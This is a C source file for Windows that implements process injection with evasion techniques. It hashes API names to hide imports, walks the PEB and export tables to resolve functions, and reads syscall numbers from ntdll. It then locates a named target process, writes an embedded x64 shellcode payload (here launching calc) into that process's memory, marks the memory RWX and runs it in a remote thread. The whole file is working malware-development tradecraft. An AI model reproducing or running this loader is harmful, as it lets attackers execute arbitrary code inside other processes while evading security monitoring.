#include "base.h"

/// API Hashing
#define INITIAL_SEED 4567

// Create macros for using hashing algorithms faster and easier
#define HASHA(STRING) (HashJenkinsOneAtATime32BitA((PCHAR)STRING))
#define HASHW(STRING) (HashJenkinsOneAtATime32BitW((PWCHAR)STRING))

UINT32 HashJenkinsOneAtATime32BitA(IN PCHAR string) {

    SIZE_T sIndex = 0;
    UINT32 uHash = 0;
    SIZE_T sLength = lstrlenA(string);

    while (sIndex != sLength)
    {
        uHash += string[sIndex++];
        uHash += uHash << INITIAL_SEED;
        uHash ^= uHash >> 6;
    }

    uHash += uHash << 3;
    uHash ^= uHash >> 11;
    uHash += uHash << 15;

    return uHash;
}

UINT32 HashJenkinsOneAtATime32BitW(IN PWCHAR string) {

    SIZE_T sIndex = 0;
    UINT32 uHash = 0;
    SIZE_T sLength = lstrlenW(string);

    while (sIndex != sLength)
    {
        uHash += string[sIndex++];
        uHash += uHash << INITIAL_SEED;
        uHash ^= uHash >> 6;
    }

    uHash += uHash << 3;
    uHash ^= uHash >> 11;
    uHash += uHash << 15;

    return uHash;
}

// Custom GetProcAddress 
FARPROC GetProcAddressH(IN HMODULE hModule, IN DWORD dwApiNameHash) {

    if (!hModule || !dwApiNameHash) return NULL;

    PBYTE pBase = (PBYTE)hModule;

    // Get DOS Header
    PIMAGE_DOS_HEADER pImgDosHdr = (PIMAGE_DOS_HEADER)pBase;
    if (pImgDosHdr->e_magic != IMAGE_DOS_SIGNATURE) {
        return NULL;
    }

    // Get NT Headers
    PIMAGE_NT_HEADERS pImgNtHdr = (PIMAGE_NT_HEADERS)(pBase + pImgDosHdr->e_lfanew);
    if (pImgNtHdr->Signature != IMAGE_NT_SIGNATURE) {
        return NULL;
    }

    // Get Optional Header
    IMAGE_OPTIONAL_HEADER ImgOptHdr = pImgNtHdr->OptionalHeader;
    if (ImgOptHdr.Magic != IMAGE_NT_OPTIONAL_HDR_MAGIC) {
        return NULL;
    }

    // Get pointer to the Export Table structure
    PIMAGE_EXPORT_DIRECTORY pImgExportDir = (PIMAGE_EXPORT_DIRECTORY)(pBase + ImgOptHdr.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

    // Get relevant information from the export directory to search for a specific function
    PDWORD FnNameArray = (PDWORD)(pBase + pImgExportDir->AddressOfNames);			// function names
    PDWORD FnAddressArray = (PDWORD)(pBase + pImgExportDir->AddressOfFunctions);  // function addresses
    PWORD FnOrdinalArray = (PWORD)(pBase + pImgExportDir->AddressOfNameOrdinals); // function ordinals

    // Loop over exported functions 
    for (DWORD i = 0; i < pImgExportDir->NumberOfFunctions; i++) {

        // Get name of the function 
        CHAR* pFnName = (CHAR*)(pBase + FnNameArray[i]); // Name
        WORD wFnOrdinal = FnOrdinalArray[i]; // Ordinal
        PVOID pFnAddress = (PVOID)(pBase + FnAddressArray[wFnOrdinal]); // Address

        // Search for the function that matches the hash and return it
        if (HASHA(pFnName) == dwApiNameHash) {
            OKAY("[ 0x%p ] Found function \"%s\"", pFnAddress, pFnName);
            return pFnAddress;
        }
    }

    WARN("Function for hash 0x%X not found.", dwApiNameHash);
    return NULL;
}

// Custom GetModuleHandle
HMODULE GetModuleHandleH(IN DWORD dwModuleNameHash) {

    if (!dwModuleNameHash) return NULL;

    PPEB pPeb = NULL;

    // Use to __readgsqword macro to get the address of the PPEB by specifying the offset of 0x60 (0x30 on 32-bit systems, since PVOID has a since of 4 on there.
#ifdef _WIN64
    pPeb = __readgsqword(0x60); // sizeof(PVOID) = 8 --[ * 12 ]--> 96 --[ HEX ]--> 0x60
#elif _WIN32
    pPeb = __readgsqword(0x30); // sizeof(PVOID) = 4 --> [ * 12 ] = 48 --[ HEX ]-- 0x30
#endif 

    // Get PED_LDR_DATA structure
    PPEB_LDR_DATA pLdr = (PPEB_LDR_DATA)(pPeb->Ldr);

    // Get first element of the linked list which contains information about the first module
    // Doubly-linked lists use the Flink and Blink elements as the head and tail pointers, respectively. 
    // This means Flink points to the next node in the list whereas the Blink element points to the previous node in the list. 
    PLDR_DATA_TABLE_ENTRY pDte = (PLDR_DATA_TABLE_ENTRY)(pLdr->InMemoryOrderModuleList.Flink);

    // Loop over all modules
    while (pDte) {

        if (pDte->FullDllName.Length == NULL || pDte->FullDllName.Length > MAX_PATH) {
            break;
        }

        // Convert FullDllName.Buffer to lowercase string
        CHAR szLowercaseDllName[MAX_PATH];

        DWORD i = 0;
        for (i = 0; i < pDte->FullDllName.Length; i++) {
            szLowercaseDllName[i] = (CHAR)tolower(pDte->FullDllName.Buffer[i]);
        }
        szLowercaseDllName[i] = '\0';

        // Check if hashes match
        if (HASHA(szLowercaseDllName) == dwModuleNameHash) {
            // The DLL base address is InInitializationOrderLinks.Flink, or Reserved2[0]
            // If the undocumented structs are not present, the next line could also be written as the following
            // return (HMODULE)(pDte->Reserved2[0]
            HANDLE hModule = (HMODULE)pDte->InInitializationOrderLinks.Flink;

            OKAY_W(L"[ 0x%p ] Found module \"%s\"", hModule, pDte->FullDllName.Buffer);

            return hModule;
        }

        // Move to the next element in the linked list
        pDte = *(PLDR_DATA_TABLE_ENTRY*)(pDte);
    }

    return NULL;
}

/// Syscalls
// Global variables storing the SSN numbers 
DWORD g_NtOpenProcessSSN;
DWORD g_NtAllocateVirtualMemorySSN;
DWORD g_NtWriteVirtualMemorySSN;
DWORD g_NtProtectVirtualMemorySSN;
DWORD g_NtCreateThreadExSSN;
DWORD g_NtWaitForSingleObjectSSN;
DWORD g_NtFreeVirtualMemorySSN;
DWORD g_NtCloseSSN;
DWORD g_NtQuerySystemInformationSSN;

// Modified version to retrieve syscall number using API hash instead of string
VOID GetSyscallNumberH(IN HMODULE hNtdll, IN DWORD dwApiNameHash, OUT DWORD* pdwSsn) {
    
    UINT_PTR pNtFunctionAddress = NULL; 

    pNtFunctionAddress = (UINT_PTR)GetProcAddressH(hNtdll, dwApiNameHash);
    if (!pNtFunctionAddress) {
        PRINT_ERROR("GetProcAddress"); 
        return; 
    }

    *pdwSsn = ((PBYTE)(pNtFunctionAddress + 0x4))[0]; 
    INFO("[ 0x%p ] [ 0x%X ] Retrieved system service number (SSN).", pNtFunctionAddress, *pdwSsn); 
    return; 
}

/// Injection
BOOL GetRemoteProcessHandle(IN LPCWSTR szProcessName, OUT DWORD* dwPid, OUT HANDLE* pHandle) {

    BOOL bState = TRUE;
    NTSTATUS STATUS = NULL;

    HMODULE hNtdll = NULL; 
    PSYSTEM_PROCESS_INFORMATION ProcInfo = NULL;
    ULONG uReturnLength1 = NULL;
    ULONG uReturnLength2 = NULL;
    PVOID pValueToFree = NULL;

    // Getting NtQuerySystemInformation's SSN
    INFO_W(L"Searching for process %s...", szProcessName); 
    hNtdll = GetModuleHandleH(ntdll_HASH);
    if (!hNtdll) {
        PRINT_ERROR("GetModuleHandleH");
    }
    OKAY("[ 0x%p ] Got handle to ntdll.dll", hNtdll);

    /// Get SSN for each syscall
    GetSyscallNumberH(hNtdll, NtQuerySystemInformation_HASH, &g_NtQuerySystemInformationSSN);

    /// Get System Information
    /*__kernel_entry NTSTATUS NtQuerySystemInformation(
        [in]            SYSTEM_INFORMATION_CLASS SystemInformationClass,
        [in, out]       PVOID                    SystemInformation,
        [in]            ULONG                    SystemInformationLength,
        [out, optional] PULONG                   ReturnLength
    );*/
    // First NtQuerySystemInformation call will fail but provide information about how much memory needs to be allocated via uReturnLength
    STATUS = NtQuerySystemInformation(SystemProcessInformation, NULL, NULL, &uReturnLength1);
    ProcInfo = (PSYSTEM_PROCESS_INFORMATION)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, (SIZE_T)uReturnLength1);
    if (!ProcInfo) {
        PRINT_ERROR("HeapAlloc");
        bState = FALSE;
        goto CLEANUP;
    }

    // Second NtQuerySystemInformation call
    STATUS = NtQuerySystemInformation(SystemProcessInformation, ProcInfo, uReturnLength1, &uReturnLength2);
    if (STATUS != 0x0) {
        PRINT_NTERROR("NtQuerySystemInformation");
        bState = FALSE;
        goto CLEANUP;
    }

    // Since we will modify 'SystemProcInfo', we will save its initial value before the while loop to free it later
    pValueToFree = ProcInfo;

    // Loop over processes
    while (TRUE) {
        /// Compare every process name to the one we are looking ofr
        if (ProcInfo->ImageName.Length && wcscmp(ProcInfo->ImageName.Buffer, szProcessName) == 0) {
            *dwPid = ProcInfo->UniqueProcessId;
            *pHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, ProcInfo->UniqueProcessId);
            break;
        }

        // If NextEntryOffset is 0, we reached the end of the array
        if (!ProcInfo->NextEntryOffset)
            break;

        // Move to the next element in the array
        ProcInfo = (PSYSTEM_PROCESS_INFORMATION)((ULONG_PTR)ProcInfo + ProcInfo->NextEntryOffset);
    }

    // Check if process was found
    if (*dwPid == NULL || *pHandle == NULL) {
        WARN_W(L"Process \"%s\" not found.", szProcessName);
        bState = FALSE;
    }

CLEANUP:

    HeapFree(GetProcessHeap(), 0, pValueToFree);

    return bState;
}

BOOL InjectViaDirectSyscalls(IN HANDLE hProcess, IN PBYTE pShellcode, IN DWORD dwSize) {

    NTSTATUS STATUS = NULL; 
    BOOL bState = TRUE; 

    SIZE_T sSize = sizeof(pShellcode);

    HMODULE hNtdll = NULL; 
    PVOID pAddress = NULL; 
    SIZE_T sBytesWritten = NULL; 
    DWORD dwOldProtection = NULL; 
    HANDLE hThread = NULL; 
    OBJECT_ATTRIBUTES OA = { sizeof(OA), NULL };

    INFO("Setting up..."); 
    /// Get handle to ntdll.dll
    hNtdll = GetModuleHandleH(ntdll_HASH); 
    if (!hNtdll) {
        PRINT_ERROR("GetModuleHandleH"); 
    }
    OKAY("[ 0x%p ] Got handle to ntdll.dll", hNtdll); 

    /// Get SSN for each syscall
    GetSyscallNumberH(hNtdll, NtAllocateVirtualMemory_HASH, &g_NtAllocateVirtualMemorySSN); 
    GetSyscallNumberH(hNtdll, NtWriteVirtualMemory_HASH, &g_NtWriteVirtualMemorySSN); 
    GetSyscallNumberH(hNtdll, NtProtectVirtualMemory_HASH, &g_NtProtectVirtualMemorySSN); 
    GetSyscallNumberH(hNtdll, NtCreateThreadEx_HASH, &g_NtCreateThreadExSSN); 
    GetSyscallNumberH(hNtdll, NtWaitForSingleObject_HASH, &g_NtWaitForSingleObjectSSN); 
    GetSyscallNumberH(hNtdll, NtFreeVirtualMemory_HASH, &g_NtFreeVirtualMemorySSN); 
    GetSyscallNumberH(hNtdll, NtClose_HASH, &g_NtCloseSSN);

    /// Injection
    INFO("Performing Injection..."); 

    // Allocate memory using NtAllocateVirtualMemory
    STATUS = NtAllocateVirtualMemory(hProcess, &pAddress, NULL, &sSize, (MEM_COMMIT | MEM_RESERVE), PAGE_READWRITE); 
    if (STATUS != STATUS_SUCCESS) {
        PRINT_NTERROR("NtAllocateVirtualMemory"); 
        bState = FALSE; 
        goto CLEANUP; 
    }
    OKAY("[ 0x%p ] [RW-] Allocated %d bytes of memory.", pAddress, sSize); 

    // Move payload to allocated memory using NtWriteVirtualMemory
    STATUS = NtWriteVirtualMemory(hProcess, pAddress, pShellcode, dwSize, &sBytesWritten); 
    if (STATUS != STATUS_SUCCESS) {
        PRINT_NTERROR("NtWriteVirtualMemory"); 
        bState = FALSE;
        goto CLEANUP; 
    }
    OKAY("[ 0x%p ] Wrote %d bytes.", pAddress, sBytesWritten); 

    // Change mememory protection using NtProtectVirtualMemory
    STATUS = NtProtectVirtualMemory(hProcess, &pAddress, &sSize, PAGE_EXECUTE_READWRITE, &dwOldProtection); 
    if (STATUS != STATUS_SUCCESS) {
        PRINT_NTERROR("NtProtectVirtualMemory"); 
        bState = FALSE;
        goto CLEANUP; 
    }
    OKAY("{ 0x%p ] [RWX] Changed memory protection.", pAddress); 

    // Create thread using NtCreateThreadEx
    STATUS = NtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, &OA, hProcess, (PTHREAD_START_ROUTINE)pAddress, NULL, 0, 0, 0, 0, NULL);
    if (STATUS != STATUS_SUCCESS) {
        PRINT_NTERROR("NtCreateThreadEx");
        bState = FALSE;
        goto CLEANUP;
    }
    OKAY("[ 0x%p ] Created thread.", hThread); 

    // Wait using NtWaitForSingleObject
    STATUS = NtWaitForSingleObject(hThread, FALSE, NULL);
    if (STATUS != STATUS_SUCCESS) {
        PRINT_NTERROR("NtWaitForSingleObject");
        bState = FALSE;
        goto CLEANUP; 
    }

CLEANUP:

    // Free memory using NtFreeVirtualMemory
    if (pAddress) {
        STATUS = NtFreeVirtualMemory(hProcess, &pAddress, &sSize, MEM_DECOMMIT); 
        if (STATUS != STATUS_SUCCESS) {
            PRINT_NTERROR("NtFreeVirtualMemory");
            return bState; 
        }
        OKAY("[ 0x%p ] Decommited allocated memory.", pAddress); 
    }

    // Close handles using NtClose
    if (hThread) {
        STATUS = NtClose(hThread); 
        OKAY("[ 0x%p ] Thread handle closed.", hThread); 
    }

    if (hProcess) {
        STATUS = NtClose(hProcess); 
        OKAY("[ 0x%p ] Process handle closed.", hProcess); 
    }

    return bState; 
}

int wmain(int argc, wchar_t* argv[]) {

    // String hashing for API and module names 
    /*printf("#define %s_HASH 0x%X\n", "ntdll.dll", HASHA("ntdll.dll"));
    printf("#define %s_HASH 0x%X\n", "NtAllocateVirtualMemory", HASHA("NtAllocateVirtualMemory"));
    printf("#define %s_HASH 0x%X\n", "NtWriteVirtualMemory", HASHA("NtWriteVirtualMemory"));
    printf("#define %s_HASH 0x%X\n", "NtProtectVirtualMemory", HASHA("NtProtectVirtualMemory"));
    printf("#define %s_HASH 0x%X\n", "NtCreateThreadEx", HASHA("NtCreateThreadEx"));
    printf("#define %s_HASH 0x%X\n", "NtWaitForSingleObject", HASHA("NtWaitForSingleObject"));
    printf("#define %s_HASH 0x%X\n", "NtFreeVirtualMemory", HASHA("NtFreeVirtualMemory"));
    printf("#define %s_HASH 0x%X\n", "NtClose", HASHA("NtClose"));
    printf("#define %s_HASH 0x%X\n", "NtQuerySystemInformation", HASHA("NtQuerySystemInformation"));
    
    return 0; */

    // x64 calc payload
    unsigned char pShellcode[] = {
        0xFC, 0x48, 0x83, 0xE4, 0xF0, 0xE8, 0xC0, 0x00, 0x00, 0x00, 0x41, 0x51,
        0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xD2, 0x65, 0x48, 0x8B, 0x52,
        0x60, 0x48, 0x8B, 0x52, 0x18, 0x48, 0x8B, 0x52, 0x20, 0x48, 0x8B, 0x72,
        0x50, 0x48, 0x0F, 0xB7, 0x4A, 0x4A, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,
        0xAC, 0x3C, 0x61, 0x7C, 0x02, 0x2C, 0x20, 0x41, 0xC1, 0xC9, 0x0D, 0x41,
        0x01, 0xC1, 0xE2, 0xED, 0x52, 0x41, 0x51, 0x48, 0x8B, 0x52, 0x20, 0x8B,
        0x42, 0x3C, 0x48, 0x01, 0xD0, 0x8B, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48,
        0x85, 0xC0, 0x74, 0x67, 0x48, 0x01, 0xD0, 0x50, 0x8B, 0x48, 0x18, 0x44,
        0x8B, 0x40, 0x20, 0x49, 0x01, 0xD0, 0xE3, 0x56, 0x48, 0xFF, 0xC9, 0x41,
        0x8B, 0x34, 0x88, 0x48, 0x01, 0xD6, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,
        0xAC, 0x41, 0xC1, 0xC9, 0x0D, 0x41, 0x01, 0xC1, 0x38, 0xE0, 0x75, 0xF1,
        0x4C, 0x03, 0x4C, 0x24, 0x08, 0x45, 0x39, 0xD1, 0x75, 0xD8, 0x58, 0x44,
        0x8B, 0x40, 0x24, 0x49, 0x01, 0xD0, 0x66, 0x41, 0x8B, 0x0C, 0x48, 0x44,
        0x8B, 0x40, 0x1C, 0x49, 0x01, 0xD0, 0x41, 0x8B, 0x04, 0x88, 0x48, 0x01,
        0xD0, 0x41, 0x58, 0x41, 0x58, 0x5E, 0x59, 0x5A, 0x41, 0x58, 0x41, 0x59,
        0x41, 0x5A, 0x48, 0x83, 0xEC, 0x20, 0x41, 0x52, 0xFF, 0xE0, 0x58, 0x41,
        0x59, 0x5A, 0x48, 0x8B, 0x12, 0xE9, 0x57, 0xFF, 0xFF, 0xFF, 0x5D, 0x48,
        0xBA, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x8D,
        0x01, 0x01, 0x00, 0x00, 0x41, 0xBA, 0x31, 0x8B, 0x6F, 0x87, 0xFF, 0xD5,
        0xBB, 0xE0, 0x1D, 0x2A, 0x0A, 0x41, 0xBA, 0xA6, 0x95, 0xBD, 0x9D, 0xFF,
        0xD5, 0x48, 0x83, 0xC4, 0x28, 0x3C, 0x06, 0x7C, 0x0A, 0x80, 0xFB, 0xE0,
        0x75, 0x05, 0xBB, 0x47, 0x13, 0x72, 0x6F, 0x6A, 0x00, 0x59, 0x41, 0x89,
        0xDA, 0xFF, 0xD5, 0x63, 0x61, 0x6C, 0x63, 0x00
    };

    HANDLE hProcess = NULL; 
    DWORD dwProcessId = NULL; 

    if (argc < 2) {
        WARN_W(L"Usage: %s [process name].", argv[0]); 
        return EXIT_FAILURE; 
    }

    if (!GetRemoteProcessHandle(argv[1], &dwProcessId, &hProcess)) {
        PRINT_ERROR("GetRemoteProcessHandle"); 
        return EXIT_FAILURE; 
    }
    OKAY_W(L"[ 0x%p ] [ %d ] Found process.", hProcess, dwProcessId); 

    if (!InjectViaDirectSyscalls(hProcess, pShellcode, sizeof(pShellcode))) {
        PRINT_ERROR("InjectViaDirectSyscalls"); 
        return EXIT_FAILURE; 
    }

    OKAY("Done."); 

    return EXIT_SUCCESS; 
}